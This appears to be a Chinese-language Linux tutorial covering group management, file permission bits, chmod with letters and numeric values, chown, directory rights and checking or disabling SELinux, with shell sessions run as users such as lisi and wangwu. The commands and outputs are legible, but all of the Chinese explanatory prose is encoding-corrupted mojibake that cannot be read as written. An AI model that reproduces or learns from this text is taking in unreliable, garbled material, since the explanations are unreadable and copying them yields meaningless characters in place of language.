æŒ‡å®šç»„æ¥åˆ›å»ºç”¨æˆ·#æŒ‡å®šç»„æ¥åˆ›å»ºç”¨æˆ·ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šç»„ï¼Œé‚£ä¹ˆåˆ›å»ºç”¨æˆ·çš„æ—¶å€™ï¼Œlinuxä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸ç”¨æˆ·ååŒåçš„ç»„ã€‚ä¾‹å­ï¼š ç»„çš„è‹±æ–‡æ˜¯group[root@localhost tmp]# useradd -g test1 test3 #-g æ˜¯æŒ‡å®šä¸»ç»„[root@localhost tmp]# id test3uid=1002(test3) gid=1000(test1) ç»„=1000(test1)# gidè¡¨ç¤ºç”¨æˆ·çš„å±ç»„çš„ä¸»ç»„# ç»„=è¡¨ç¤ºç”¨æˆ·çš„å±ç»„ï¼Œç”¨æˆ·å¯ä»¥å±äºå¤šä¸ªç»„ï¼Œä¸€ä¸ªä¸»ç»„ï¼Œå¤šä¸ªå…¶ä»–ç»„ã€‚ 2-3 åˆ é™¤ç»„# åˆ é™¤ç»„groupdel ç»„åä¾‹å­ï¼š[root@localhost tmp]# groupdel test #å¦‚æœç»„å†…æœ‰ç”¨æˆ·ï¼Œä¼šæŠ¥é”™ï¼Œéœ€è¦å…ˆåˆ é™¤ä¸»ç»„å±äºè¿™ä¸ªç»„çš„æ‰€æœ‰ç”¨æˆ·(userdel -r ç”¨æˆ·å)ï¼Œæˆ–è€…å°†ç”¨æˆ·ç§»åˆ°å…¶ä»–çš„ç»„ä¹‹ååœ¨åˆ é™¤ç»„ã€‚# ä¿®æ”¹ç»„å# groupmod -n jaden wulaoban # å°†wulaobanç»„åæ”¹ä¸ºjaden 2-4 ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„ä¸»ç»„# ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„ä¸»ç»„usermod -g ç»„åä¾‹å­ï¼š[root@localhost tmp]# usermod -g test jaden #å°†jadenç”¨æˆ·çš„ä¸»ç»„æ”¹ä¸ºtest[root@localhost tmp]# groupdel jaden # å°±å¯ä»¥å°†jadenç»„åˆ é™¤äº†ã€‚# å°†ç”¨æˆ·æ·»åŠ åˆ°å¤šä¸ªå…¶ä»–ç»„ä¸­usermod -G[root@localhost tmp]# usermod -G test wulaoban # å°†wulaobanç”¨æˆ·ä¹Ÿæ·»åŠ åˆ°testç»„ 2.8 æƒé™ç®¡ç†2.8.1 æƒé™ä»‹ç»å’Œç¤ºä¾‹## rootç”¨æˆ·æƒé™æœ€é«˜ï¼Œæ‰€ä»¥ä¸€èˆ¬å¯¹ä»–ä¸åšä»€ä¹ˆæƒé™è®¾ç½®ã€‚å…¶ä»–ç”¨æˆ·å°±è¦è®¾å®šæƒé™å¹¶ä¸”éµå®ˆæƒé™äº†ã€‚æ–‡ä»¶æƒé™ï¼š#æ–‡ä»¶å±æ€§[root@localhost ~]# ls -l /tmp/123.txt -rw-r--r--. 1 root root 0 7æœˆ 20 23:17 /tmp/123.txt #ç¬¬ä¸€æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œè¡¨ç¤ºæ–‡ä»¶ç±»å‹ -æ–‡ä»¶ã€dç›®å½•ã€lè½¯é“¾æ¥(å¯¹åº”ç€windowså¿«æ·æ–¹å¼)ã€bå—è®¾å¤‡(ls /devï¼Œå¯ä»¥çœ‹åˆ°ç¡¬ç›˜sdaç­‰)#ç¬¬ä¸€æ®µç¬¬2-4å­—ç¬¦ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€å±ç”¨æˆ·çš„æƒé™#ç¬¬ä¸€æ®µç¬¬5-7å­—ç¬¦ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€å±ç”¨æˆ·ç»„çš„æƒé™#ç¬¬ä¸€æ®µç¬¬8-10å­—ç¬¦ï¼Œè¡¨ç¤ºå…¶ä»–ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶çš„æƒé™ r 4 ä»£è¡¨è¯»æƒé™ read w 2 ä»£è¡¨å†™æƒé™ write x 1 ä»£è¡¨å¯æ‰§è¡Œæƒé™ executable - 0 ç©ºæƒé™ä½ï¼Œè¡¨ç¤ºæ²¡æœ‰è¿™ä¸ªæƒé™ï¼Œ9ä½æƒé™ä¸èƒ½å°‘ï¼Œæ²¡æœ‰çš„æƒé™å°±ç”¨-ä»£æ›¿ã€‚æƒé™å€¼è¡¨ 0 --- 1 --x 2 -w- 3 -wx 4 r-- 5 r-x 6 rw- 7 rwxugoæƒé™ä½“ç³»: rw- r-- r-- user group other ## rootæ²¡åŠæ³•ç©æ˜‚ï¼Œå› ä¸ºé»˜è®¤æƒé™å¤ªé«˜ã€‚æˆ‘ä»¬ç”¨æ™®é€šç”¨æˆ·æ¥ç©ï¼šç”¨xshellå¼€å¯å¤šä¸ªçª—å£è¿æ¥ä¸Šè¿™ä¸‰ä¸ªç”¨æˆ·ã€‚åˆ›å»ºä¸‰ä¸ªç”¨æˆ·å¹¶è®¾ç½®å¯†ç ï¼šlisiã€wangwuã€zhaoliu[root@localhost ~]# useradd lisi[root@localhost ~]# passwd lisi æ›´æ”¹ç”¨æˆ· lisi çš„å¯†ç  ã€‚ æ–°çš„ å¯†ç ï¼š æ— æ•ˆçš„å¯†ç ï¼š å¯†ç å°‘äº 8 ä¸ªå­—ç¬¦ é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š passwdï¼šæ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚ [root@localhost ~]# useradd wangwu[root@localhost ~]# passwd wangwu æ›´æ”¹ç”¨æˆ· wangwu çš„å¯†ç  ã€‚ æ–°çš„ å¯†ç ï¼š æ— æ•ˆçš„å¯†ç ï¼š å¯†ç å°‘äº 8 ä¸ªå­—ç¬¦ é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š passwdï¼šæ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚ [root@localhost ~]# [root@localhost ~]# useradd zhaoliu[root@localhost ~]# passwd zhaoliu æ›´æ”¹ç”¨æˆ· zhaoliu çš„å¯†ç  ã€‚ æ–°çš„ å¯†ç ï¼š æ— æ•ˆçš„å¯†ç ï¼š å¯†ç å°‘äº 8 ä¸ªå­—ç¬¦ é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š passwdï¼šæ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°## ä½¿ç”¨lisiæ¥ç™»å½•ï¼Œå¹¶åˆ›å»ºä¸ªæ–‡ä»¶ï¼Œå°†æ–‡ä»¶æƒé™å…¨éƒ¨å»æ‰ï¼Œä¿®æ”¹æƒé™ç”¨chmodæŒ‡ä»¤ï¼Œå…¨ç§°change modeï¼š# ä¾‹å¦‚ï¼šchomd -r,å°±æ˜¯å»æ‰ræƒé™ï¼Œchomd +rå°±æ˜¯åŠ ä¸Šè¯»æƒé™ï¼Œchmod +wrå°±æ˜¯åŠ è¯»å†™æƒé™ï¼Œchmod u+rï¼Œå°±æ˜¯ç»™æ–‡ä»¶å±ä¸»ç”¨æˆ·æ·»åŠ è¯»æƒé™ç­‰ [lisi@localhost ~]$ touch 1.txt [lisi@localhost ~]$ vi 1.txt [lisi@localhost ~]$ ls -l æ€»ç”¨é‡ 4 -rw-rw-r--. 1 lisi lisi 12 3æœˆ 20 09:07 1.txt [lisi@localhost ~]$ chmod -rw 1.txt [lisi@localhost ~]$ ls -l æ€»ç”¨é‡ 4 ----------. 1 lisi lisi 12 3æœˆ 20 09:07 1.txt ## ç°åœ¨è¿™ä¸ªæ–‡ä»¶æ˜¯æ²¡æœ‰ä»»ä½•æƒé™çš„ï¼Œä½†æ˜¯æ–‡ä»¶æ˜¯lisiåˆ›å»ºçš„ï¼Œæ–‡ä»¶å±ä¸»è¿˜æ˜¯lisiï¼Œè™½ç„¶æ˜¾ç¤ºlisiä¹Ÿæ²¡æœ‰æƒé™ï¼Œä½†æ˜¯å®é™…ä¸Šlisiæ˜¯å¯ä»¥ä¿®æ”¹æ–‡ä»¶æƒé™çš„ï¼Œå…¶ä»–ç”¨æˆ·(é™¤äº†root)æ˜¯æ²¡æœ‰æƒåŠ›ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶æƒé™çš„ã€‚è¯»æƒé™çš„ä½œç”¨ï¼š ## lisiç”¨æˆ·ï¼š [lisi@localhost ~]$ chmod -rw 1.txt [lisi@localhost ~]$ ls -l æ€»ç”¨é‡ 4 ----------. 1 lisi lisi 12 3æœˆ 20 09:07 1.txt [lisi@localhost ~]$ cat 1.txt cat: 1.txt: æƒé™ä¸å¤Ÿ [lisi@localhost ~]$ chmod u+r 1.txt [lisi@localhost ~]$ ls -l æ€»ç”¨é‡ 4 -r--------. 1 lisi lisi 12 3æœˆ 20 09:07 1.txt [lisi@localhost ~]$ cat 1.txt hello jaden1 ## ä¸ºäº†æ–¹ä¾¿å…¶ä»–ç”¨æˆ·æŸ¥çœ‹ï¼Œæˆ‘ä»¬å…ˆå°†1.txtæ”¾åˆ°/tmpç›®å½•ä¸‹ã€‚ [lisi@localhost ~]$ mv 1.txt /tmp/ [lisi@localhost ~]$ ls /tmp/ 1.txt ## wangwuç”¨æˆ·ï¼š [wangwu@localhost ~]$ cd /tmp/ [wangwu@localhost tmp]$ cat 1.txt cat: 1.txt: æƒé™ä¸å¤Ÿ [wangwu@localhost tmp]$ chmod o+r 1.txt chmod: æ›´æ”¹1.txt çš„æƒé™: ä¸å…è®¸çš„æ“ä½œ ## åˆ‡æ¢åˆ°lisiï¼šç»™oåŠ ä¸Šræƒé™ï¼Œå†çœ‹æ•ˆæœ [lisi@localhost ~]$ chmod o+r /tmp/1.txt [lisi@localhost ~]$ ls -l /tmp/ æ€»ç”¨é‡ 8 -r-----r--. 1 lisi lisi 12 3æœˆ 20 09:07 1.txt ## å†åˆ‡æ¢åˆ°wangwuæ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼š [wangwu@localhost tmp]$ cat 1.txt hello jaden# å†™æƒé™çš„ä½œç”¨ï¼š## ä½†æ˜¯wangwuæƒ³ç¼–è¾‘æ–‡ä»¶ï¼Œä¹Ÿæ˜¯æ²¡æœ‰æƒé™çš„ã€‚å¯ä»¥viæ‰“å¼€ï¼Œä½†æ˜¯ç¼–è¾‘ä¹‹åä¸èƒ½ä¿å­˜ã€‚## å†åˆ‡æ¢åˆ°lisiï¼Œç»™oä¸€ä¸ªwæƒé™ï¼Œwangwuå°±å¯ä»¥ç¼–è¾‘ä¿å­˜äº†ã€‚ [lisi@localhost ~]$ chmod o+w /tmp/1.txt [lisi@localhost ~]$ ls -l /tmp/ æ€»ç”¨é‡ 8 -r-----rw-. 1 lisi lisi 12 3æœˆ 20 09:07 1.txtwangwuç¼–è¾‘ä¿å­˜ä¸€ä¸‹ï¼ŒæŸ¥çœ‹å†…å®¹ï¼š [wangwu@localhost tmp]$ vi 1.txt [wangwu@localhost tmp]$ cat 1.txt hello jaden hello wangwu## å¯æ‰§è¡Œæƒé™çš„ä½œç”¨ï¼šè¿™ä¸ªéœ€è¦æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå‘½ä»¤æ–‡ä»¶æ‰èƒ½çœ‹æ•ˆæœï¼Œæˆ‘å¤åˆ¶æŸä¸ªå‘½ä»¤æ–‡ä»¶è¿‡æ¥ï¼Œè°å¤åˆ¶è¿‡æ¥çš„ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å±ä¸»å°±æ˜¯è°ï¼Œå¦‚ä¸‹. ä»£è¡¨å½“å‰ç›®å½•.. ä»£è¡¨ä¸Šä¸€çº§ç›®å½•## åˆ‡æ¢åˆ°lisiç”¨æˆ·æ¥å¤åˆ¶lsæ–‡ä»¶åˆ°/tmpç›®å½•ä¸‹ï¼Œå¹¶å°†æ‰§è¡Œæƒé™å»æ‰ï¼Œå»æ‰æ‰§è¡Œæƒé™çš„æ–‡ä»¶æ˜¾ç¤ºä½ç™½è‰²ï¼Œæœ‰æ‰§è¡Œæƒé™çš„æ˜¾ç¤ºä¸ºç»¿è‰²ã€‚[lisi@localhost ~]$ cd /tmp/ [lisi@localhost tmp]$ cp /bin/ls . [lisi@localhost tmp]$ ls -l -r-----rw-. 1 lisi lisi 25 3æœˆ 20 09:24 1.txt -rwx------. 1 root root 836 3æœˆ 15 20:14 ks-script-ed2ODG -rwxr-xr-x. 1 lisi lisi 117608 3æœˆ 20 09:29 ls [lisi@localhost tmp]$ chmod -x ls [lisi@localhost tmp]$ ls -l -r-----rw-. 1 lisi lisi 25 3æœˆ 20 09:24 1.txt -rwx------. 1 root root 836 3æœˆ 15 20:14 ks-script-ed2ODG -rw-r--r--. 1 lisi lisi 117608 3æœˆ 20 09:29 ls ## åˆ‡æ¢åˆ°wangwuæ¥æ‰§è¡Œä¸€ä¸‹lsè¿™ä¸ªæ–‡ä»¶ï¼š æ³¨æ„ï¼Œä¸èƒ½ç›´æ¥lsï¼Œç›´æ¥lsè¿˜æ˜¯è°ƒç”¨ç³»ç»Ÿ/bin/lsæ–‡ä»¶ï¼Œéœ€è¦å†™./lsæ‰æ˜¯ä½¿ç”¨å½“å‰ç›®å½•ä¸‹çš„lsæ–‡ä»¶ï¼Œæˆ–è€…å†™è¿™ä¸ªæ–‡ä»¶çš„ç»å¯¹è·¯å¾„/tmp/lsï¼Œæˆ–è€…å°†å®ƒæ”¾åˆ°æŸä¸ªç‰¹å®šç›®å½•ä¸‹ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨å¯¹åº”æŒ‡ä»¤è€Œä¸ç”¨ç®¡è·¯å¾„äº†ï¼Œè¿™ä¸ªæˆ‘åœ¨ä¸‹é¢æœ‰è¡¥å……è¯´æ˜ã€‚ [wangwu@localhost tmp]$ ./ls -bash: ./ls: æƒé™ä¸å¤Ÿ [wangwu@localhost tmp]$ /tmp/ls -bash: /tmp/ls: æƒé™ä¸å¤Ÿ 2.8.2 å¯æ‰§è¡Œç¨‹åºç‰¹æ®Šç›®å½•è¯´æ˜## é€šè¿‡echo $PATHå¯ä»¥çœ‹åˆ°ï¼Œç±»ä¼¼äºwindowsçš„ç¯å¢ƒå˜é‡ä¸­çš„PATHã€‚åå¼æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸­çš„å‘½ä»¤ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„ç›®å½•ä¸‹é€šè¿‡è¿™ä¸ªå‘½ä»¤ç¨‹åºåç§°æ¥ç›´æ¥è°ƒç”¨å‘½ä»¤æ¥æ‰§è¡Œï¼š[lisi@localhost tmp]$ echo $PATH # ä¸‹é¢è¿™å‡ ä¸ªå°±æ˜¯ç¯å¢ƒå˜é‡è·¯å¾„å­˜æ”¾ä½ç½®/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/lisi/.local/bin:/home/lisi/bin lisi@localhost tmp]$ cp ./ls /home/lisi/bin/[lisi@localhost tmp]$ ls /home/lisi/bin/ ls[lisi@localhost tmp]$ mv /home/lisi/bin/ls /home/lisi/bin/xxx # ä¸ºäº†ä¸å’Œç³»ç»Ÿé»˜è®¤çš„lså†²çªï¼Œæˆ‘ä»¬æ”¹åä¸ºxxx[lisi@localhost tmp]$ ls /home/lisi/bin/ xxx[lisi@localhost tmp]$ xxx[lisi@localhost tmp]$ xxx # å‘½ä»¤å¯ä»¥åœ¨ä»»æ„ç›®å½•ä¸‹ç›´æ¥æ‰§è¡Œ1.txt ls 2.8.3 æƒé™å€¼æƒé™å€¼ï¼šr 4w 2x 1- 0æƒé™å€¼è¡¨0 ---1 --x2 -w-3 -wx4 r--5 r-x6 rw-7 rwx## ä¿®æ”¹æƒé™ä¸¾ä¾‹## å¦‚æœæˆ‘ä»¬æƒ³å°†æŸä¸ªæ–‡ä»¶çš„ï¼šrwxr-xr-xæƒé™æ”¹ä¸º--x-w-r--ï¼Œå¦‚æœæŒ‰ç…§å‰é¢æˆ‘ä»¬chmodæŒ‡å®šå­—æ¯çš„å½¢å¼æ¥ä¿®æ”¹ï¼Œå°±æ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥ä½¿ç”¨æƒé™å¯¹åº”çš„æ•°å­—æ”¹å°±å¾ˆæ–¹ä¾¿ï¼šrwxr-xr-x å¯¹åº”çš„å€¼ä¸ºï¼š755--x-w-r-- å¯¹åº”çš„å€¼ä¸ºï¼š124[lisi@localhost tmp]$ chmod 124 1.txt[lisi@localhost tmp]$ ls -l---x-w-r--. 1 lisi lisi 25 3æœˆ 20 09:24 1.txt## åˆ«äººå†é—®ä½ ï¼ŒæŸä¸ªæ–‡ä»¶çš„æƒé™æ˜¯å¤šå°‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯ç›´æ¥æŠ¥æ•°å­—å€¼ï¼Œæ¯”å¦‚å®ƒçš„æƒé™æ˜¯755#æ”¹å˜æ–‡ä»¶çš„æƒé™ï¼Œä¾‹å¦‚ï¼šchomd -r,å°±æ˜¯å»æ‰ræƒé™ï¼Œchomd +rå°±æ˜¯åŠ ä¸Šè¯»æƒé™chmodä¾‹å­1ï¼š#ä¿®æ”¹æƒé™ä¹‹å‰ [test1@localhost tmp]$ ls -l -rw-rw----. 1 test1 test1 8 7æœˆ 20 17:20 test1.txt\\ #ä¿®æ”¹æƒé™ [test1@localhost tmp]$ chmod u+x test1.txt #ä¿®æ”¹æƒé™ä¹‹å [test1@localhost tmp]$ ls -l -rwxrw----. 1 test1 test1 8 7æœˆ 20 17:20 test1.txt ä¾‹å­2ï¼š## åŒæ—¶ä¿®æ”¹å¤šä¸ªæƒé™ [test1@localhost tmp]$ chmod u-x,g-x,o+x test1.txt [test1@localhost tmp]$ ls -l -rw-rw---x. 1 test1 test1 8 7æœˆ 20 17:20 test1.txt ä¾‹å­3ï¼š## æ•°å­—ä¿®æ”¹æ›´æ–¹ä¾¿ [test1@localhost tmp]$ chmod 777 test1.txt [test1@localhost tmp]$ ls -l -rwxrwxrwx. 1 test1 test1 8 7æœˆ 20 17:20 test1.txt 2.9 ä¿®æ”¹æ–‡ä»¶æ‰€å±#ä¿®æ”¹æ–‡ä»¶çš„æ‰€å±,æ™®é€šç”¨æˆ·æ˜¯ä¸èƒ½ä¿®æ”¹å…¶ä»–ç”¨æˆ·æ–‡ä»¶çš„æ‰€å±çš„ï¼Œéœ€è¦rootç”¨æˆ·ï¼Œæ‰€ä»¥å…ˆåˆ‡æ¢åˆ°rootç”¨æˆ·æ¥æ“ä½œchown 2.9.1 ä¿®æ”¹ç”¨æˆ·å’Œç”¨æˆ·ç»„ä¾‹å­1## ä¿®æ”¹æ‰€å±ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œtest2:test2ï¼Œå‰é¢çš„test2è¡¨ç¤ºç”¨æˆ·ï¼Œåé¢çš„test2æ˜¯ç»„ [root@localhost tmp]# chown test2:test2 ls [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7æœˆ 20 17:43 grep -rwxr-xr-x. 1 test2 test2 117608 7æœˆ 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7æœˆ 20 17:43 mv -rw-rw-rw-. 1 test1 test1 14 7æœˆ 20 17:38 test1.txt # chown -R nginx:nginx .# æŠŠå½“å‰æ–‡ä»¶å¤¹æ‰€æœ‰æ–‡ä»¶åŠå­æ–‡ä»¶éƒ½æ”¹æˆnginxç”¨æˆ·å’ŒNginxç»„çš„ 2.9.2 ä¿®æ”¹æ‰€å±ç”¨æˆ·# ä¿®æ”¹æ‰€å±ç”¨æˆ· [root@localhost tmp]# chown test1 ls [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7æœˆ 20 17:43 grep -rwxr-xr-x. 1 test1 test2 117608 7æœˆ 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7æœˆ 20 17:43 mv -rw-rw-rw-. 1 test1 test1 14 7æœˆ 20 17:38 test1.txt 2.9.3 ä¿®æ”¹ç›®å½•æƒé™å’Œæ‰€å±ä¾‹å­3ï¼šæ–‡ä»¶å¤¹(ç›®å½•æƒé™)##ç”¨rootç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹é»˜è®¤æ‰€å±ç”¨æˆ·å’Œç»„ä¸ºroot:rootï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·æ˜¯æ²¡å…¨é™åˆ¶åœ¨è¿™ä¸ªç›®å½•ä¸­åˆ›å»ºæ–‡ä»¶çš„ã€‚ [root@localhost ~]# cd /tmp/ [root@localhost tmp]# mkdir jaden [root@localhost tmp]# ls -l drwxr-xr-x. 2 root root 6 3æœˆ 20 11:36 jaden ## æ™®é€šç”¨æˆ·ï¼Œæ¯”å¦‚lisiæƒ³åœ¨é‡Œé¢åˆ›å»ºæ–‡ä»¶ï¼š [lisi@localhost tmp]$ cd jaden/ [lisi@localhost jaden]$ touch 2.txt touch: æ— æ³•åˆ›å»º2.txt: æƒé™ä¸å¤Ÿ ## å¦‚ä½•è®©lisiæœ‰åˆ›å»ºæ–‡ä»¶çš„æƒé™å‘¢ï¼Ÿåˆ›å»ºæ–‡ä»¶çš„æƒé™å°±æ˜¯ç›®å½•å†™æƒé™ ## é¦–å…ˆè¦åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œç„¶åç”¨rootç”¨æˆ·ä¿®æ”¹ç›®å½•æƒé™ï¼Œæˆ–è€…ç›´æ¥å°†ç›®å½•çš„æ‰€å±ä¿®æ”¹ä¸ºlisiä¿®æ”¹æƒé™ï¼š [root@localhost tmp]# chmod o+w jaden [root@localhost tmp]# ls -l drwxr-xrwx. 2 root root 6 3æœˆ 20 11:36 jaden ## åˆ‡æ¢åˆ°lisiï¼Œåˆ›å»ºæ–‡ä»¶ï¼š [lisi@localhost jaden]$ touch 2.txt [lisi@localhost jaden]$ ls 2.txt ## ä¿®æ”¹æ‰€å±ï¼š [root@localhost tmp]# chmod o-w jaden [root@localhost tmp]# ls -l drwxr-xr-x. 2 root root 19 3æœˆ 20 11:39 jaden [root@localhost tmp]# chown lisi:lisi jaden [root@localhost tmp]# ls -l drwxr-xr-x. 2 lisi lisi 19 3æœˆ 20 11:39 jaden ## åˆ‡æ¢åˆ°lisiï¼š [lisi@localhost jaden]$ touch 3.txt [lisi@localhost jaden]$ ls 2.txt 3.txt ## lisiä¹Ÿå¯ä»¥ä¿®æ”¹ç›®å½•çš„æƒé™äº†ï¼Œå› ä¸ºå®ƒå®Œå…¨å±äºçš„lisiï¼š [lisi@localhost tmp]$ chmod o+w jaden [lisi@localhost tmp]$ ls -l drwxr-xrwx. 2 lisi lisi 32 3æœˆ 20 11:42 jaden 2.9.4 uid å’Œgidä¿®æ”¹æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·å’Œç”¨æˆ·ç»„#ä½¿ç”¨uidå’Œgidä¿®æ”¹æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·å’Œæ‰€å±ç”¨æˆ·ç»„ å±ä¸»ï¼Œå±ç»„ä¾‹å­2ï¼š [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7æœˆ 20 17:43 grep -rwxr-xr-x. 1 test1 test2 117608 7æœˆ 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7æœˆ 20 17:43 mv -rw-rw-rw-. 1 test1 test1 14 7æœˆ 20 17:38 test1.txt [root@localhost tmp]# id test1 uid=1000(test1) gid=1000(test1) ç»„=1000(test1) [root@localhost tmp]# id test2 uid=1001(test2) gid=1001(test2) ç»„=1001(test2) [root@localhost tmp]# useradd -g test1 test3 [root@localhost tmp]# id test3 uid=1002(test3) gid=1000(test1) ç»„=1000(test1) [root@localhost tmp]# chown 1001:1001 test1.txt [root@localhost tmp]# ls -l -rwxr-xr-x. 1 test2 test2 159024 7æœˆ 20 17:43 grep -rwxr-xr-x. 1 test1 test2 117608 7æœˆ 20 17:38 ls -rwxr-xr-x. 1 test1 test1 130360 7æœˆ 20 17:43 mv -rw-rw-rw-. 1 test2 test2 14 7æœˆ 20 17:38 test1.txt 2.9.5æ–‡ä»¶æƒé™å’Œç›®å½•æƒé™çš„è§£é‡Šè¯´æ˜## æ–‡ä»¶æƒé™ï¼š rwx è¯»å†™æ‰§è¡Œ## ç›®å½•çš„æƒé™ï¼š ## rwxï¼Œrè¡¨ç¤ºå¯ä»¥æŸ¥çœ‹ç›®å½•ä¸‹æœ‰å“ªäº›æ–‡ä»¶ ## xè¡¨ç¤ºå¯ä»¥cdåˆ‡æ¢åˆ°è¯¥ç›®å½• ## wè¡¨ç¤ºå¯ä»¥åœ¨ç›®å½•ä¸­åˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤æ–‡ä»¶ç­‰æ“ä½œ ## ä¸ºäº†å®‰å…¨æ“ä½œï¼š ## æ–‡ä»¶æƒé™é»˜è®¤ï¼š 644æƒé™ã€ç‹ ä¸€ç‚¹å°±ç»™600æƒé™ ## ç›®å½•æƒé™é»˜è®¤ï¼š 755æƒé™ã€ç‹ ä¸€ç‚¹å°±ç»™700æƒé™ 2.10 æ–‡ä»¶å±æ€§è¯¦è§£2.10.1 æ–‡ä»¶å±æ€§#æ–‡ä»¶å±æ€§[root@localhost ~]# ls -l -rw-rw-rw-. 1 lisi lisi 0 3æœˆ 20 16:00 222.txt#ç¬¬ä¸€æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œè¡¨ç¤ºæ–‡ä»¶ç±»å‹ ## -æ–‡ä»¶ã€ ## dç›®å½•ã€ ## lè½¯é“¾æ¥(å¯¹åº”ç€windowså¿«æ·æ–¹å¼)ã€ ## bå—è®¾å¤‡(ls /devï¼Œå¯ä»¥çœ‹åˆ°ç¡¬ç›˜sdaç­‰) #ç¬¬ä¸€æ®µç¬¬2-4å­—ç¬¦ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€å±ç”¨æˆ·çš„æƒé™#ç¬¬ä¸€æ®µç¬¬5-7å­—ç¬¦ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶æ‰€å±ç”¨æˆ·ç»„çš„æƒé™#ç¬¬ä¸€æ®µç¬¬8-10å­—ç¬¦ï¼Œè¡¨ç¤ºå…¶ä»–ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶çš„æƒé™#ç¬¬ä¸€æ®µçš„ç¬¬11ä¸ªå­—ç¬¦. ï¼Œè¡¨ç¤ºå¼€å¯selinuxçš„çŠ¶æ€ä¸‹åˆ›å»ºçš„ï¼Œä¹Ÿè¯æ˜selinuxæ˜¯å¼€å¯çŠ¶æ€çš„ã€‚# çœ‹åˆ°.è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶å—åˆ°selinuxçš„ä¿æŠ¤ï¼Œselinuxï¼šhttps://baike.baidu.com/item/SELinux/8865268?fr=aladdinï¼Œè¿™ä¸ªä¸œè¥¿å¾ˆå®‰å…¨ï¼Œä½†æ˜¯æœ‰äº†å®ƒå˜å¾—å¾ˆéº»çƒ¦ï¼Œå®‰å…¨å’Œä¾¿åˆ©ä¸€èˆ¬æ˜¯å†²çªçš„ã€‚ä¸»è¦æ˜¯çº¢å¸½ç³»çš„ç³»ç»Ÿ(redhat\\centos\\é˜¿é‡Œçš„é¾™èœ¥\\åä¸ºçš„æ¬§æ‹‰)æœ‰è¿™ä¸ªæœºåˆ¶ã€‚æˆ‘ä»¬ä¸€èˆ¬ä¸Šæ¥å°±æ˜¯å…³é—­å®ƒï¼Œå®‰å…¨æ–¹é¢æˆ‘ä»¬é€šè¿‡å…¶ä»–æ–¹æ³•æ¥æ§åˆ¶ã€‚æŸ¥çœ‹selinuxçš„æŒ‡ä»¤ï¼š # æŸ¥çœ‹çŠ¶æ€ [lisi@localhost tmp]$ sestatus SELinux status: enabled # enabledè¡¨ç¤ºå¼€å¯çŠ¶æ€ï¼Œdisabledè¡¨ç¤ºç¦ç”¨çŠ¶æ€ SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Max kernel policy version: 31 # å…³é—­å’Œå¼€å¯selinuxï¼Œéœ€è¦rootæƒé™æ‰èƒ½ä¿®æ”¹ [root@localhost tmp]# ls -l /etc/selinux/config -rw-r--r--. 1 root root 543 3æœˆ 15 20:11 /etc/selinux/config [root@localhost tmp]# vi /etc/selinux/config æŠŠ7è¡Œæ”¹ä¸ºï¼š SELINUX=disabled #ç„¶åä¿å­˜é€€å‡ºï¼Œå¹¶ä¸”é‡å¯ç³»ç»Ÿæ‰ä¼šç”Ÿæ•ˆã€‚ # ç„¶åå†ç™»å½•åˆ›å»ºæ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼Œå°±çœ‹ä¸åˆ°.äº† [root@localhost ~]# touch 1.txt [root@localhost ~]# ls -l -rw-r--r-- 1 root root 0 3æœˆ 20 13:32 1.txt #ç¬¬äºŒæ®µçš„æ•°å­—ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶çš„ç¡¬é“¾æ¥æ•°é‡ï¼Œå…¶å®è¿™ä¸ªå’Œæˆ‘ä»¬çš„å®‰å…¨æ²¡æœ‰å¤ªå¤§å…³ç³»ï¼Œè¿ç»´äººå‘˜éœ€è¦å­¦ä¹ 